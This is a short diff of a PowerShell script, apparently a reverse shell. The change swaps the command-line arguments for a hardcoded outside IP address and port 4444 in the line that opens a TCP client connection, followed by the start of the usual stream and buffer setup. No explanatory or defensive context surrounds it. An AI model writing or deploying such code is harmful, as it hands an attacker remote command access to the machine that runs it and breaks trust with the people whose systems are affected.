@@ -1,6 +1,6 @@
     try 
       {
-        $client = New-Object System.Net.Sockets.TCPClient($args[0],$args[1])
+        $client = New-Object System.Net.Sockets.TCPClient("54.86.108.251",4444)
         $stream = $client.GetStream()
         [byte[]]$bytes = 0..65535|%{0}
 
